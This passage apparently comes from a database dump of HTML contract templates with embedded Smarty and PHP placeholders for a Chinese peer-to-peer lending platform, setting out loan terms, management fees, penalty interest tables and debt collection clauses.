$this->_var[\'deal\'][\'borrow_amount\'],2);?>）\n\t\t</td>\n\t</tr>\n\t <tr>\n\t\t<td style=\"padding-left:10px\"> 到期本金\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$CURRENCY_UNIT}{function name=\"number_format\" v=$deal.borrow_amount f=2}\n\t\t</td>\n\t</tr>\n\t<tr>\n\t\t<td style=\"padding-left:10px\"> 还款分期月数\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$deal.repay_time}个月\n\t\t</td>\n\t</tr>\n\t<tr>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t还款日\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t 自{function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"Y年m月d日\"}起，每月{function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"d\"}日（24:00前，节假日不顺延）\n\t\t</td>\n\t</tr>\n\t<tr>\n\t\t<td style=\"padding-left:10px\"> 借款期限\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$deal.repay_time}个月，{function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"Y年m月d日\"}起，至  {function name=\"to_date\" v=\"$deal.end_repay_time\" f=\"Y年m月d日\"}日止\n\t\t</td>\n\t</tr>\n</table>\n<br/>\n<div>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第二条 各方权利和义务\n\t</p>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t<u>甲方的权利和义务</u>\n\t</p>\n\t<p> 1、\t甲方应按合同约定的借款期限起始日期将足额的借款本金支付给乙方。\n\t</p>\n\t<p> 2、\t甲方享有其所出借款项所带来的利息收益。\n\t</p>\n\t<p>3、\t如乙方违约，甲方有权要求丙方提供其已获得的乙方信息，丙方应当提供。\n\t</p>\n\t<p>4、\t无须通知乙方，甲方可以根据自己的意愿进行本协议下其对乙方债权的转让。在甲方的债权转让后，乙方需对债权受让人继续履行本协议下其对甲方的还款义务，不得以未接到债权转让通知为由拒绝履行还款义务。\n\t</p>\n\t<p> 5、\t甲方应主动缴纳由利息所得带来的可能的税费。\n\t</p>\n\t<p>6、\t如乙方实际还款金额少于本协议约定的本金、利息及违约金的，甲方各出借人同意各自按照其于本协议文首约定的借款比例收取还款。\n\t</p>\n\t<p> 7、\t甲方应确保其提供信息和资料的真实性，不得提供虚假信息或隐瞒重要事实。\n\t</p>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t<u>乙方权利和义务</u>\n\t</p>\n\t<p> 1、\t乙方必须按期足额向甲方偿还本金和利息。\n\t</p>\n\t<p> 2、    乙方必须按期足额向丙方支付借款管理费用。\n\t</p>\n\t<p>3、\t乙方承诺所借款项不用于任何违法用途。\n\t</p>\n\t<p>4、\t乙方应确保其提供的信息和资料的真实性，不得提供虚假信息或隐瞒重要事实。\n\t</p>\n\t<p>5、\t乙方有权了解其在丙方的信用评审进度及结果。\n\t</p>\n\t<p> 6、\t乙方不得将本协议项下的任何权利义务转让给任何其他方。\n\t</p>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t<u>丙方的权利和义务</u>\n\t</p>\n\t<p>1、甲方授权并委托丙方代其收取本协议文首所约定的出借人每月应收本息，代收后按照甲方的要求进行处置，乙方对此表示认可。\n\t</p>\n\t<p>2、甲方授权并委托丙方将其支付的出借本金直接划付至乙方账户，乙方对此表示认可。\n\t</p>\n\t<p> 3、甲、乙双方一致同意，在有必要时，丙方有权代甲方对乙方进行关于本协议借款的违约提醒及催收工作，包括但不限于：电话通知、上门催收提醒、发律师函、对乙方提起诉讼等。甲方在此确认委托丙方为其进行以上工作，并授权丙方可以将此工作委托给本协议外的其他方进行。乙方对前述委托的提醒、催收事项已明确知晓并应积极配合。\n\t</p>\n\t<p>4、丙方有权按月向乙方收取双方约定的借款管理费，并在有必要时对乙方进行违约提醒及催收工作，包括但不限于电话通知、发律师函、对乙方提起诉讼等。丙方有权将此违约提醒及催收工作委托给本协议外的其他方进行。\n\t</p>\n\t<p> 5、丙方接受甲乙双方的委托行为所产生的法律后果由相应委托方承担。如因乙方或甲方或其他方（包括但不限于技术问题）造成的延误或错误，丙方不承担任何责任。\n\t</p>\n\t<p> 6、丙方应对甲方和乙方的信息及本协议内容保密；如任何一方违约，或因相关权力部门要求（包括但不限于法院、仲裁机构、金融监管机构等），丙方有权披露。\n\t</p>\n\t<p>7、丙方根据本协议对乙方进行违约提醒及催收工作时，可在其认为必要时进行上门催收提醒，即丙方派出人员（至少2名）至乙方披露的住所地或经常居住地（联系地址）处催收和进行违约提醒，同时向乙方发送催收通知单，乙方应当签收，乙方不签收的，不影响上门催收提醒的进行。丙方采取上门催收提醒的，乙方应当向丙方支付上门提醒费用，收费标准为每次人民币1000.00元，此外，乙方还应向丙方支付进行上门催收提醒服务的差旅费（包括但不限于交通费、食宿费等）。\n\t</p>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t<u>丁方的权利和义务</u>\n\t</p>\n\t<p>1、出借人和借款人均同意，丁方取得出借人在本协议项下的债权后，可依法向借款人追收借款本金、利息、逾期罚息等，清收费用，坏账风险均由丁方承担。\n\t</p>\n\t<p>2、款人逾期本网站对逾期仍未还款的借款人收取逾期罚息作为催收费用、采取多种方式进行催收、将借款人的相关信息对外公开或列入“不良信用记录”或采取法律措施等各项行为，该等服务的法律后果均由借款人自行承担，如债权转让给丁方后，对借款人造成的一切责任与本网站无关，均由借款人自行承担。\n\t</p>\n\t<p> 3、若借款人的任何一期还款不足以偿还应还本金、利息和违约金，且出借人为多人时，则出借人同意按照各自出借金额在出借金额总额中的比例收取还款，不足偿还本金时直接由丁方垫付后债权直接转让给丁方再进行追讨。\n\t</p>\n\t\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第三条 借款管理费及居间服务费\n\t</p>\n\t<p>1、\t在本协议中，“借款管理费”和“居间服务费”是指因丙方为乙方提供信用咨询、评估、还款提醒、账户管理、还款特殊情况沟通、本金保障等系列信用相关服务（统称“信用服务”）而由乙方支付给丙方的报酬。\n\t</p>\n\t<p>2、\t对于丙方向乙方提供的一系列信用服务，乙方同意在借款成功时向丙方支付本协议第一条约定借款本金总额的{function name=\"number_format\" v=$deal.services_fee f=1}%(即人民币<?php echo number_format(floatval($this->_var[\'deal\'][\'services_fee\'])*$this->_var[\'deal\'][\'borrow_amount\']/100,2); ?>元)作为居间服务费，该“居间服务费”由乙方授权并委托丙方在丙方根据本协议规定的“丙方的权利和义务”第2款规定向乙方划付出借本金时从本金中予以扣除，即视为乙方已缴纳。在本协议约定的借款期限内，乙方应每月向丙方支付本协议第一条约定借款本金总额的{$deal.manage_fee}% (即人民币{function name=\"number_format\" v=\"$deal.month_manage_money\" f=2}元)，作为借款管理费用，共需支付{$deal.repay_time}期，共计人民币{function name=\"number_format\" v=\"$deal.all_manage_money\" f=2} 元，借款管理费的缴纳时间与本协议第一条约定的还款日一致。</p>\n\t<p> 本条所称的“借款成功时”系指本协议签署日。</p>\n\t<p> 3、    如乙方和丙方协商一致调整借款管理费和居间服务费时，无需经过甲方同意。 </p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第四条 违约责任\n\t</p>\n\t<p> 1、协议各方均应严格履行合同义务，非经各方协商一致或依照本协议约定，任何一方不得解除本协议。\n\t</p>\n\t<p>2、任何一方违约，违约方应承担因违约使得其他各方产生的费用和损失，包括但不限于调查、诉讼费、律师费等，应由违约方承担。如违约方为乙方的，甲方有权立即解除本协议，并要求乙方立即偿还未偿还的本金、利息、罚息、违约金。此时，乙方还应向丙方支付所有应付的借款管理费。如本协议提前解除时，乙方在{$SITE_URL}网站的账户里有任何余款的，丙方有权按照本协议第四条第3项的清偿顺序将乙方的余款用于清偿，并要求乙方支付因此产生的相关费用。</p>\n\t<p>3、乙方的每期还款均应按照如下顺序清偿：</p>\n\t<p>（1）根据本协议产生的其他全部费用；</p>\n\t<p>（2）本协议第四条第4款约定的罚息； </p>\n\t<p>（3）本协议第四条第5款约定的逾期管理费；</p>\n\t<p>（4）拖欠的利息； </p>\n\t<p>（5）拖欠的本金； </p>\n\t<p>（6）拖欠丙方的借款管理费；\n\t</p>\n\t<p>（7）正常的利息； </p>\n\t<p>（8）正常的本金； </p>\n\t<p>（9）丙方的借款管理费；</p>\n\t<p> 4、乙方应严格履行还款义务，如乙方逾期还款，则应按照下述条款向甲方支付逾期罚息，自逾期开始之后，逾期本金的正常利息停止计算。 </p>\n\t<p>罚息总额 = 逾期本息总额×对应罚息利率×逾期天数；</p>\n</div>\n<div>\n\t<br/>\n\t<table border=\"1\" style=\"margin: 0px auto; border-collapse: collapse; border: 1px solid rgb(0, 0, 0); width: 70%; \">\n\t\t<tr>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t逾期天数\n\t\t\t</td>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t1?<?php echo (int)app_conf(\"YZ_IMPSE_DAY\")-1; ?>天\n\t\t\t</td>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t{function name=\"app_conf\" v=\"YZ_IMPSE_DAY\"}天及以上\n\t\t\t</td>\n\t\t</tr>\n\t\t<tr>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t罚息利率\n\t\t\t</td>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t{$deal.impose_fee_day1}%\n\t\t\t</td>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t{$deal.impose_fee_day2}%\n\t\t\t</td>\n\t\t</tr>\n\t</table>\n\t<br/>\n\t<p>\n\t\t5、乙方应严格履行还款义务，如乙方逾期还款，则应按照下述条款向丙方支付逾期管理费：\n\t</p>\n\t<p>\n\t\t逾期管理费总额 = 逾期本息总额×对应逾期管理费率×逾期天数；\n\t</p>\n</div>\n<br/>\n<table border=\"1\" style=\"margin: 0px auto; border-collapse: collapse; border: 1px solid rgb(0, 0, 0); width: 70%; \">\n\t<tr>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t逾期天数\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t1?<?php echo (int)app_conf(\"YZ_IMPSE_DAY\")-1; ?>天\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{function name=\"app_conf\" v=\"YZ_IMPSE_DAY\"}天及以上\n\t\t</td>\n\t</tr>\n\t<tr>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t逾期管理费费率\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$deal.manage_impose_fee_day1}%\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$deal.manage_impose_fee_day2}%\n\t\t</td>\n\t</tr>\n</table>\n<br/>\n<div>\n\t<p>\n\t\t6、如果乙方逾期支付任何一期还款超过30天，或乙方在逾期后出现逃避、拒绝沟通或拒绝承认欠款事实等恶意行为，本协议项下的全部借款本息及借款管理费均提前到期，乙方应立即清偿本协议下尚未偿付的全部本金、利息、罚息、借款管理费及根据本协议产生的其他全部费用。\n\t</p>\n\t<p>\n\t\t7、如果乙方逾期支付任何一期还款超过30天，或乙方在逾期后出现逃避、拒绝沟通或拒绝承认欠款事实等恶意行为，丙方有权将乙方的“逾期记录”记入人民银行公民征信系统，丙方不承担任何法律责任。\n\t</p>\n\t<p>\n\t\t8、如果乙方逾期支付任何一期还款超过30天，或乙方在逾期后出现逃避、拒绝沟通或拒绝承认欠款事实等恶意行为，丙方有权将乙方违约失信的相关信息及乙方其他信息向媒体、用人单位、公安机关、检查机关、法律机关披露，丙方不承担任何责任。\n\t</p>\n\t<p>\n\t\t9、在乙方还清全部本金、利息、借款管理费、罚息、逾期管理费之前，罚息及逾期管理费的计算不停止。\n\t</p>\n\t<p>\n\t\t10、本协议中的所有甲方与乙方之间的借款均是相互独立的，一旦乙方逾期未归还借款本息，甲方中的任何一个出借人均有权单独向乙方追索或者提起诉讼。如乙方逾期支付借款管理费或提供虚假信息的，丙方亦可单独向乙方追索或者提起诉讼。\n\t</p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第五条 提前还款\n\t</p>\n\t<p>\n\t\t1、乙方可在借款期间任何时候提前偿还剩余借款。\n\t</p>\n\t<p>\n\t\t2、提前偿还全部剩余借款\n\t</p>\n\t<p style=\"padding-left: 15px\">\n\t\t1）乙方提前清偿全部剩余借款时，应向甲方支付当期应还本息，剩余本金及提前还款补偿（补偿金额为剩余本金的{$deal.compensate_fee}%）。\n\t</p>\n\t<p style=\"padding-left: 15px\">\n\t\t2）乙方提前清偿全部剩余借款时，应向丙方支付当期借款管理费，乙方无需支付剩余还款期的借款管理费。\n\t</p>\n\t<p>\n\t\t3、提前偿还部分借款\n\t</p>\n\t<p style=\"padding-left: 15px\">\n\t\t1）乙方提前偿还部分借款，仍应向甲方支付全部借款利息。\n\t</p>\n\t<p style=\"padding-left: 15px\">\n\t\t2）乙方提前偿还部分借款，仍应向丙方支付全部应付的借款管理费。\n\t</p>\n\t<p>\n\t\t4、任何形式的提前还款不影响丙方向乙方收取在本协议第三条中说明的居间服务费。\n\t</p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第六条\t法律及争议解决\n\t</p>\n\t <p>\n\t\t 本协议的签订、履行、终止、解释均适用中华人民共和国法律，并由丙方所在地{function name=\"app_conf\" v=\'COMPANY_REG_ADDRESS\'}人民法院管辖。\n\t</p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第七条\t附则\n\t</p>\n\t<p>\n\t\t1、本协议采用电子文本形式制成，并永久保存在丙方为此设立的专用服务器上备查，各方均认可该形式的协议效力。\n\t</p>\n\t<p>\n\t\t2、本协议自文本最终生成之日生效。\n\t</p>\n\t<p>\n\t\t3、本协议签订之日起至借款全部清偿之日止，乙方或甲方有义务在下列信息变更三日内提供更新后的信息给丙方：本人、本人的家庭联系人及紧急联系人、工作单位、居住地址、住所电话、手机号码、电子邮箱、银行账户的变更。若因任何一方不及时提供上述变更信息而带来的损失或额外费用应由该方承担。\n\t</p>\n\t<p>\n\t\t4、如果本协议中的任何一条或多条违反适用的法律法规，则该条将被视为无效，但该无效条款并不影响本协议其他条款的效力。\n\t</p>\n        <br>\n\t{if $deal.attachment}\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第八条\t附件\n\t</p>\n\t<p>\n\t\t{$deal.attachment}\n\t</p>\n\t{/if}\n</div>\n<br/>\n<div style=\"width: 98%;text-align: right;\">\n\t<p>\n\t\t{function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"Y年m月d日\"}\n\t</p>\n</div>',1,1),(5,'到期本息合同范本【普通】','<div style=\"width: 98%;text-align: right;\">编号：<span>{$deal.deal_sn}</span></div>\n<h2 align=\"center\">借款协议</h2>\n<br/>\n<div style=\"text-align: left;font-weight: 600;\">甲方（出借人）：</div>\n<table border=\"1\" style=\"margin: 0px auto; border-collapse: collapse; border: 1px solid rgb(0, 0, 0); width: 70%; \">\n    <tr>\n\t<td style=\"text-align:center;\"> {$SITE_TITLE}用户名</td>\n\t<td style=\"text-align:center;\"> 借出金额</td>\n\t<td style=\"text-align:center;\">借款期限</td>\n\t<td style=\"text-align:center;\"> 到期还本息</td>\n    </tr>\n    {foreach from=\"$loan_list\" item=\"loan\"}\n    <tr>\n\t<td style=\"text-align:center;\">{$loan.user_name}</td>\n\t<td style=\"text-align:right;padding-right:10px\">{$CURRENCY_UNIT}{function name=\"number_format\" v=$loan.money f=2}</td>\n\t<td style=\"text-align:center;\">{$deal.repay_time}{if $deal.repay_time_type eq 0}天{else}个月{/if}</td>\n\t<td style=\"text-align:right;padding-right:10px\">\n\t{$CURRENCY_UNIT}{function name=\"number_format\" v=$loan.get_repay_money f=2}\n\t</td>\n    </tr>\n    {/foreach}\n    <tr>\n\t<td style=\"text-align:center;\">总计</td>\n\t<td style=\"text-align:right;padding-right:10px\">{$CURRENCY_UNIT}{function name=\"number_format\" v=$deal.load_money f=2}</td>\n\t<td>?</td>\n\t<td>?</td>\n    </tr>\n</table>\n<p>注：因计算中存在四舍五入，最后一期应收本息与之前略有不同</p>\n<br/>\n<div>\n\t<p style=\"text-align: left;font-weight: 600;\">乙方（借款人）：</p>\n\t<p style=\"text-align: left;font-weight: 600;\">{$SITE_TITLE}用户名：<span>{$deal.user.user_name}</span></p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\"> 丙方（见证人）：{function name=\"app_conf\" v=\"COMPANY\"} </p>\n\t<p style=\"text-align: left;font-weight: 600;\">联系方式：{function name=\"app_conf\" v=\"COMPANY_ADDRESS\"}</p>\n</div>\n<br/>\n<p><strong>鉴于：</strong></p>\n<p>1、丙方是一家在{function name=\"app_conf\" v=\"COMPANY_REG_ADDRESS\"}合法成立并有效存续的有限责任公司，拥有{$SITE_URL} 网站（以下简称“该网站”）的经营权，提供信用咨询，为交易提供信息服务；</p>\n<p>2、乙方已在该网站注册，并承诺其提供给丙方的信息是完全真实的；</p>\n<p>3、甲方承诺对本协议涉及的借款具有完全的支配能力，是其自有闲散资金，为其合法所得；并承诺其提供给丙方的信息是完全真实的；</p>\n<p>4、乙方有借款需求，甲方亦同意借款，双方有意成立借贷关系；</p>\n<br/>\n<p style=\"text-align: left;font-weight: 600;\">各方经协商一致，于<span> {function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"Y年m月d日\"}</span>签订如下协议，共同遵照履行：</p>\n<br/>\n<p style=\"text-align: left;font-weight: 600;\"> 第一条 借款基本信息</p>\n<br/>\n<table border=\"1\" style=\"margin: 0px auto; border-collapse: collapse; border: 1px solid rgb(0, 0, 0); width: 70%; \">\n\t<tr>\n\t\t<td width=\"20%\" style=\"padding-left:10px\"> 借款详细用途</td>\n\t\t<td style=\"padding-left:10px\"> {$deal.type_info.name}</td>\n\t</tr>\n\t<tr>\n\t\t<td style=\"padding-left:10px\">借款本金数额</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$CURRENCY_UNIT}{function name=\"number_format\" v=$deal.borrow_amount f=2}（各出借人借款本金数额详见本协议文首表格）\n\t\t</td>\n\t</tr>\n\t<tr>\n\t\t<td style=\"padding-left:10px\">到期还本息\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$CURRENCY_UNIT}{function name=\"number_format\" v=$deal.last_month_repay_money f=2}\n\t\t</td>\n\t</tr>\n\t\n\t<tr>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t还款日\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t 自{function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"Y年m月d日\"}起，{function name=\"to_date\" v=\"$deal.end_repay_time\" f=\"Y年m月d日\"}（24:00前，节假日不顺延）\n\t\t</td>\n\t</tr>\n\t<tr>\n\t\t<td style=\"padding-left:10px\"> 借款期限\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$deal.repay_time}{if $deal.repay_time_type eq 0}天{else}个月{/if}，{function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"Y年m月d日\"}起，至  {function name=\"to_date\" v=\"$deal.end_repay_time\" f=\"Y年m月d日\"}日止\n\t\t</td>\n\t</tr>\n</table>\n<br/>\n<div>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第二条 各方权利和义务\n\t</p>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t<u>甲方的权利和义务</u>\n\t</p>\n\t<p> 1、\t甲方应按合同约定的借款期限起始日期将足额的借款本金支付给乙方。\n\t</p>\n\t<p> 2、\t甲方享有其所出借款项所带来的利息收益。\n\t</p>\n\t<p>3、\t如乙方违约，甲方有权要求丙方提供其已获得的乙方信息，丙方应当提供。\n\t</p>\n\t<p>4、\t无须通知乙方，甲方可以根据自己的意愿进行本协议下其对乙方债权的转让。在甲方的债权转让后，乙方需对债权受让人继续履行本协议下其对甲方的还款义务，不得以未接到债权转让通知为由拒绝履行还款义务。\n\t</p>\n\t<p> 5、\t甲方应主动缴纳由利息所得带来的可能的税费。\n\t</p>\n\t<p>6、\t如乙方实际还款金额少于本协议约定的本金、利息及违约金的，甲方各出借人同意各自按照其于本协议文首约定的借款比例收取还款。\n\t</p>\n\t<p> 7、\t甲方应确保其提供信息和资料的真实性，不得提供虚假信息或隐瞒重要事实。\n\t</p>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t<u>乙方权利和义务</u>\n\t</p>\n\t<p> 1、\t乙方必须按期足额向甲方偿还本金和利息。\n\t</p>\n\t<p> 2、    乙方必须按期足额向丙方支付借款管理费用。\n\t</p>\n\t<p>3、\t乙方承诺所借款项不用于任何违法用途。\n\t</p>\n\t<p>4、\t乙方应确保其提供的信息和资料的真实性，不得提供虚假信息或隐瞒重要事实。\n\t</p>\n\t<p>5、\t乙方有权了解其在丙方的信用评审进度及结果。\n\t</p>\n\t<p> 6、\t乙方不得将本协议项下的任何权利义务转让给任何其他方。\n\t</p>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t<u>丙方的权利和义务</u>\n\t</p>\n\t<p>1、甲方授权并委托丙方代其收取本协议文首所约定的出借人每月应收本息，代收后按照甲方的要求进行处置，乙方对此表示认可。\n\t</p>\n\t<p>2、甲方授权并委托丙方将其支付的出借本金直接划付至乙方账户，乙方对此表示认可。\n\t</p>\n\t<p> 3、甲、乙双方一致同意，在有必要时，丙方有权代甲方对乙方进行关于本协议借款的违约提醒及催收工作，包括但不限于：电话通知、上门催收提醒、发律师函、对乙方提起诉讼等。甲方在此确认委托丙方为其进行以上工作，并授权丙方可以将此工作委托给本协议外的其他方进行。乙方对前述委托的提醒、催收事项已明确知晓并应积极配合。\n\t</p>\n\t<p>4、丙方有权按月向乙方收取双方约定的借款管理费，并在有必要时对乙方进行违约提醒及催收工作，包括但不限于电话通知、发律师函、对乙方提起诉讼等。丙方有权将此违约提醒及催收工作委托给本协议外的其他方进行。\n\t</p>\n\t<p> 5、丙方接受甲乙双方的委托行为所产生的法律后果由相应委托方承担。如因乙方或甲方或其他方（包括但不限于技术问题）造成的延误或错误，丙方不承担任何责任。\n\t</p>\n\t<p> 6、丙方应对甲方和乙方的信息及本协议内容保密；如任何一方违约，或因相关权力部门要求（包括但不限于法院、仲裁机构、金融监管机构等），丙方有权披露。\n\t</p>\n\t<p>7、丙方根据本协议对乙方进行违约提醒及催收工作时，可在其认为必要时进行上门催收提醒，即丙方派出人员（至少2名）至乙方披露的住所地或经常居住地（联系地址）处催收和进行违约提醒，同时向乙方发送催收通知单，乙方应当签收，乙方不签收的，不影响上门催收提醒的进行。丙方采取上门催收提醒的，乙方应当向丙方支付上门提醒费用，收费标准为每次人民币1000.00元，此外，乙方还应向丙方支付进行上门催收提醒服务的差旅费（包括但不限于交通费、食宿费等）。\n\t</p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第三条 借款管理费及居间服务费\n\t</p>\n\t<p>1、\t在本协议中，“借款管理费”和“居间服务费”是指因丙方为乙方提供信用咨询、评估、还款提醒、账户管理、还款特殊情况沟通、本金保障等系列信用相关服务（统称“信用服务”）而由乙方支付给丙方的报酬。\n\t</p>\n\t<p>2、\t对于丙方向乙方提供的一系列信用服务，乙方同意在借款成功时向丙方支付本协议第一条约定借款本金总额的{function name=\"number_format\" v=$deal.services_fee f=1}%(即人民币<?php echo number_format(floatval($this->_var[\'deal\'][\'services_fee\'])*$this->_var[\'deal\'][\'borrow_amount\']/100,2); ?>元)作为居间服务费，该“居间服务费”由乙方授权并委托丙方在丙方根据本协议规定的“丙方的权利和义务”第2款规定向乙方划付出借本金时从本金中予以扣除，即视为乙方已缴纳。在本协议约定的借款期限内，乙方应每月向丙方支付本协议第一条约定借款本金总额的{$deal.manage_fee}% (即人民币{function name=\"number_format\" v=\"$deal.month_manage_money\" f=2}元)，作为借款管理费用，共需支付{if $deal.repay_time_type eq 0}1{else}{$deal.repay_time}{/if}期，共计人民币{function name=\"number_format\" v=\"$deal.all_manage_money\" f=2} 元，借款管理费的缴纳时间与本协议第一条约定的还款日一致。</p>\n\t<p> 本条所称的“借款成功时”系指本协议签署日。</p>\n\t<p> 3、    如乙方和丙方协商一致调整借款管理费和居间服务费时，无需经过甲方同意。 </p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第四条 违约责任\n\t</p>\n\t<p> 1、协议各方均应严格履行合同义务，非经各方协商一致或依照本协议约定，任何一方不得解除本协议。\n\t</p>\n\t<p>2、任何一方违约，违约方应承担因违约使得其他各方产生的费用和损失，包括但不限于调查、诉讼费、律师费等，应由违约方承担。如违约方为乙方的，甲方有权立即解除本协议，并要求乙方立即偿还未偿还的本金、利息、罚息、违约金。此时，乙方还应向丙方支付所有应付的借款管理费。如本协议提前解除时，乙方在{$SITE_URL}网站的账户里有任何余款的，丙方有权按照本协议第四条第3项的清偿顺序将乙方的余款用于清偿，并要求乙方支付因此产生的相关费用。</p>\n\t<p>3、乙方的每期还款均应按照如下顺序清偿：</p>\n\t<p>（1）根据本协议产生的其他全部费用；</p>\n\t<p>（2）本协议第四条第4款约定的罚息； </p>\n\t<p>（3）本协议第四条第5款约定的逾期管理费；</p>\n\t<p>（4）拖欠的利息； </p>\n\t<p>（5）拖欠的本金； </p>\n\t<p>（6）拖欠丙方的借款管理费；\n\t</p>\n\t<p>（7）正常的利息； </p>\n\t<p>（8）正常的本金； </p>\n\t<p>（9）丙方的借款管理费；</p>\n\t<p> 4、乙方应严格履行还款义务，如乙方逾期还款，则应按照下述条款向甲方支付逾期罚息，自逾期开始之后，逾期本金的正常利息停止计算。 </p>\n\t<p>罚息总额 = 逾期本息总额×对应罚息利率×逾期天数；</p>\n</div>\n<div>\n\t<br/>\n\t<table border=\"1\" style=\"margin: 0px auto; border-collapse: collapse; border: 1px solid rgb(0, 0, 0); width: 70%; \">\n\t\t<tr>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t逾期天数\n\t\t\t</td>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t1?<?php echo (int)app_conf(\"YZ_IMPSE_DAY\")-1; ?>天\n\t\t\t</td>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t{function name=\"app_conf\" v=\"YZ_IMPSE_DAY\"}天及以上\n\t\t\t</td>\n\t\t</tr>\n\t\t<tr>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t罚息利率\n\t\t\t</td>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t{$deal.impose_fee_day1}%\n\t\t\t</td>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t{$deal.impose_fee_day2}%\n\t\t\t</td>\n\t\t</tr>\n\t</table>\n\t<br/>\n\t<p>\n\t\t5、乙方应严格履行还款义务，如乙方逾期还款，则应按照下述条款向丙方支付逾期管理费：\n\t</p>\n\t<p>\n\t\t逾期管理费总额 = 逾期本息总额×对应逾期管理费率×逾期天数；\n\t</p>\n</div>\n<br/>\n<table border=\"1\" style=\"margin: 0px auto; border-collapse: collapse; border: 1px solid rgb(0, 0, 0); width: 70%; \">\n\t<tr>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t逾期天数\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t1?<?php echo (int)app_conf(\"YZ_IMPSE_DAY\")-1; ?>天\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{function name=\"app_conf\" v=\"YZ_IMPSE_DAY\"}天及以上\n\t\t</td>\n\t</tr>\n\t<tr>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t逾期管理费费率\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$deal.manage_impose_fee_day1}%\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$deal.manage_impose_fee_day2}%\n\t\t</td>\n\t</tr>\n</table>\n<br/>\n<div>\n\t<p>\n\t\t6、如果乙方逾期支付任何一期还款超过30天，或乙方在逾期后出现逃避、拒绝沟通或拒绝承认欠款事实等恶意行为，本协议项下的全部借款本息及借款管理费均提前到期，乙方应立即清偿本协议下尚未偿付的全部本金、利息、罚息、借款管理费及根据本协议产生的其他全部费用。\n\t</p>\n\t<p>\n\t\t7、如果乙方逾期支付任何一期还款超过30天，或乙方在逾期后出现逃避、拒绝沟通或拒绝承认欠款事实等恶意行为，丙方有权将乙方的“逾期记录”记入人民银行公民征信系统，丙方不承担任何法律责任。\n\t</p>\n\t<p>\n\t\t8、如果乙方逾期支付任何一期还款超过30天，或乙方在逾期后出现逃避、拒绝沟通或拒绝承认欠款事实等恶意行为，丙方有权将乙方违约失信的相关信息及乙方其他信息向媒体、用人单位、公安机关、检查机关、法律机关披露，丙方不承担任何责任。\n\t</p>\n\t<p>\n\t\t9、在乙方还清全部本金、利息、借款管理费、罚息、逾期管理费之前，罚息及逾期管理费的计算不停止。\n\t</p>\n\t<p>\n\t\t10、本协议中的所有甲方与乙方之间的借款均是相互独立的，一旦乙方逾期未归还借款本息，甲方中的任何一个出借人均有权单独向乙方追索或者提起诉讼。如乙方逾期支付借款管理费或提供虚假信息的，丙方亦可单独向乙方追索或者提起诉讼。\n\t</p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第五条 提前还款\n\t</p>\n\t<p>\n\t\t1、乙方可在借款期间任何时候提前偿还剩余借款。\n\t</p>\n\t<p>\n\t\t2、提前偿还全部剩余借款\n\t</p>\n\t<p style=\"padding-left: 